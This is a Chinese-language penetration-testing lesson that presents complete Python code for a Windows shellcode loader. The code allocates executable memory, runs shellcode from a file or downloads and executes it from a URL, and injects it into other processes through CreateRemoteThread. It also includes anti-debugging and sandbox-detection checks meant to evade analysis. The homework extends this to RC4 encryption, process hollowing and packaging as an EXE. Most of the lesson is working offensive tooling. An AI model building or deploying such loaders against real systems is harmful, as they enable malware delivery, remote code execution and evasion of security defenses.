# 课时06 - Python实现ShellCode Loader

## 课程目标
1. 掌握Python调用Windows API的ctypes库
2. 理解动态加载DLL和函数的方法
3. 实现Python版本的ShellCode Loader
4. 了解Python在渗透测试中的应用

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| ctypes | C Types | Python调用C库的标准模块 |
| windll | Windows DLL | ctypes中的Windows DLL加载器 |
| c_void_p | C Void Pointer | ctypes中的void指针类型 |
| CFUNCTYPE | C Function Type | 定义C函数类型的工厂函数 |

## 代码实现

### 1. 基础Python Loader

```python
#!/usr/bin/env python3
# loader.py
# Python ShellCode Loader

import ctypes
import ctypes.wintypes as wintypes
import sys

# 常量定义
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
INFINITE = 0xFFFFFFFF

# 加载DLL
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll

# 函数原型定义
kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAlloc.restype = wintypes.LPVOID

kernel32.VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
kernel32.VirtualProtect.restype = wintypes.BOOL

kernel32.CreateThread.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
kernel32.CreateThread.restype = wintypes.HANDLE

kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

kernel32.RtlMoveMemory = ntdll.RtlMoveMemory
kernel32.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPVOID, ctypes.c_size_t]
kernel32.RtlMoveMemory.restype = None

# 测试ShellCode
shellcode = bytes([
    0x90, 0x90, 0x90, 0x90,  # NOP
    0x31, 0xC0,              # xor eax, eax
    0x40,                    # inc eax
    0xC3                     # ret
])

def method1_basic():
    """基础方法: VirtualAlloc + 函数指针"""
    print("[*] Method 1: Basic VirtualAlloc")
    
    # 分配内存
    addr = kernel32.VirtualAlloc(
        None,
        len(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )
    
    if not addr:
        print(f"[-] VirtualAlloc failed: {kernel32.GetLastError()}")
        return
    
    print(f"[+] Allocated at: 0x{addr:X}")
    
    # 复制ShellCode
    ctypes.memmove(addr, shellcode, len(shellcode))
    
    # 转换为函数并调用
    shellcode_func = ctypes.CFUNCTYPE(ctypes.c_int)(addr)
    result = shellcode_func()
    
    print(f"[+] Returned: {result}")
    
    kernel32.VirtualFree(addr, 0, MEM_RELEASE)

def method2_thread():
    """使用CreateThread执行"""
    print("[*] Method 2: CreateThread")
    
    addr = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if not addr:
        return
    
    ctypes.memmove(addr, shellcode, len(shellcode))
    
    thread = kernel32.CreateThread(None, 0, addr, None, 0, None)
    if not thread:
        print("[-] CreateThread failed")
        return
    
    print(f"[+] Thread: 0x{thread:X}")
    kernel32.WaitForSingleObject(thread, INFINITE)
    print("[+] Thread completed")

def method3_two_step():
    """两步分配: RW -> RX"""
    print("[*] Method 3: Two-Step Allocation")
    
    # RW
    addr = kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not addr:
        return
    
    print(f"[+] Allocated RW at: 0x{addr:X}")
    ctypes.memmove(addr, shellcode, len(shellcode))
    
    # RX
    old_protect = wintypes.DWORD()
    kernel32.VirtualProtect(addr, len(shellcode), PAGE_EXECUTE_READ, ctypes.byref(old_protect))
    print("[+] Changed to RX")
    
    # 执行
    thread = kernel32.CreateThread(None, 0, addr, None, 0, None)
    kernel32.WaitForSingleObject(thread, INFINITE)

def method4_xor_decrypt(encrypted: bytes, key: int) -> bytes:
    """XOR解密"""
    return bytes([b ^ key for b in encrypted])

def method5_from_file(filename: str):
    """从文件加载"""
    print(f"[*] Method 5: Load from file: {filename}")
    
    with open(filename, 'rb') as f:
        sc = f.read()
    
    print(f"[+] Loaded {len(sc)} bytes")
    
    addr = kernel32.VirtualAlloc(None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    ctypes.memmove(addr, sc, len(sc))
    
    thread = kernel32.CreateThread(None, 0, addr, None, 0, None)
    kernel32.WaitForSingleObject(thread, INFINITE)

def method6_from_url(url: str):
    """从URL下载并执行"""
    import urllib.request
    print(f"[*] Method 6: Download from: {url}")
    
    with urllib.request.urlopen(url) as resp:
        sc = resp.read()
    
    print(f"[+] Downloaded {len(sc)} bytes")
    
    addr = kernel32.VirtualAlloc(None, len(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    ctypes.memmove(addr, sc, len(sc))
    
    thread = kernel32.CreateThread(None, 0, addr, None, 0, None)
    kernel32.WaitForSingleObject(thread, INFINITE)

def main():
    print("=" * 40)
    print("     Python ShellCode Loader")
    print("=" * 40)
    print()
    
    method1_basic()
    print()
    
    method2_thread()
    print()
    
    method3_two_step()
    print()
    
    # 命令行参数
    if len(sys.argv) >= 2:
        if sys.argv[1].startswith('http'):
            method6_from_url(sys.argv[1])
        else:
            method5_from_file(sys.argv[1])
    
    print("[*] Done")

if __name__ == "__main__":
    main()
```

### 2. 高级功能

```python
#!/usr/bin/env python3
# advanced_loader.py
# 高级Python Loader

import ctypes
import ctypes.wintypes as wintypes
import base64
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

kernel32 = ctypes.windll.kernel32

# 反调试检测
def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

# 沙箱检测
def sandbox_check():
    # 检查进程数量
    import subprocess
    result = subprocess.run(['tasklist'], capture_output=True, text=True)
    process_count = len(result.stdout.strip().split('\n'))
    if process_count < 30:
        return True  # 可能是沙箱
    
    # 检查磁盘大小
    import shutil
    total, used, free = shutil.disk_usage("C:\\")
    if total < 60 * 1024 * 1024 * 1024:  # 小于60GB
        return True
    
    return False

# AES解密
def aes_decrypt(ciphertext: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)

# 远程注入
def inject_to_pid(pid: int, shellcode: bytes):
    PROCESS_ALL_ACCESS = 0x1F0FFF
    
    # OpenProcess
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not h_process:
        print(f"[-] OpenProcess failed")
        return False
    
    print(f"[+] Opened process: 0x{h_process:X}")
    
    # VirtualAllocEx
    kernel32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
    kernel32.VirtualAllocEx.restype = wintypes.LPVOID
    
    remote_mem = kernel32.VirtualAllocEx(h_process, None, len(shellcode), 0x3000, 0x40)
    if not remote_mem:
        print("[-] VirtualAllocEx failed")
        return False
    
    print(f"[+] Remote memory: 0x{remote_mem:X}")
    
    # WriteProcessMemory
    kernel32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.WriteProcessMemory.restype = wintypes.BOOL
    
    written = ctypes.c_size_t()
    kernel32.WriteProcessMemory(h_process, remote_mem, shellcode, len(shellcode), ctypes.byref(written))
    print(f"[+] Written: {written.value} bytes")
    
    # CreateRemoteThread
    kernel32.CreateRemoteThread.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID]
    kernel32.CreateRemoteThread.restype = wintypes.HANDLE
    
    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, remote_mem, None, 0, None)
    if not h_thread:
        print("[-] CreateRemoteThread failed")
        return False
    
    print(f"[+] Remote thread: 0x{h_thread:X}")
    
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    kernel32.CloseHandle(h_thread)
    kernel32.CloseHandle(h_process)
    
    return True

if __name__ == "__main__":
    # 反调试
    if is_debugged():
        print("[-] Debugger detected!")
        exit(1)
    
    # 沙箱检测
    if sandbox_check():
        print("[-] Sandbox detected!")
        exit(1)
    
    print("[+] Environment checks passed")
```

## 课后作业

### 作业1：添加RC4加密
实现RC4加密解密支持。

### 作业2：实现进程镂空
使用Python实现进程镂空技术。

### 作业3：打包为EXE
使用PyInstaller或Nuitka将脚本打包为独立EXE。
